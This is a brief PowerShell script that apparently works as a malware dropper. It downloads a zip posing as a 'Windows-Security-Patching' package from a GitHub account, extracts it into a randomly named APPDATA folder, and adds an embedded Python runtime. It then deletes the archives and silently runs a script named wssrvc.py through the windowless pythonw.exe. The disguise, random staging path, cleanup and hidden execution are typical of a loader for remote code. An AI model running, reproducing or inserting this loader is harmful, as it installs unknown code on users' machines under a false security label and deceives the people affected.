$Length = 10
$Characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
$RandomString = -join ($Characters.ToCharArray() | Get-Random -Count $Length)
$FolderName = "$RandomString"
wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurity.zip -O $env:APPDATA\WindowsSecurity.zip
Expand-Archive -Path $env:APPDATA\WindowsSecurity.zip -DestinationPath $env:APPDATA\$FolderName
wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $env:APPDATA\python-3.14.0-embed-amd64.zip
Expand-Archive -Path $env:APPDATA\python-3.14.0-embed-amd64.zip -DestinationPath $env:APPDATA\$FolderName\WindowsSecurity\
rm $env:APPDATA\WindowsSecurity.zip
rm $env:APPDATA\python-3.14.0-embed-amd64.zip
& "$env:APPDATA\\$FolderName\\WindowsSecurity\\pythonw.exe" @("$env:APPDATA\$FolderName\WindowsSecurity\wssrvc.py")
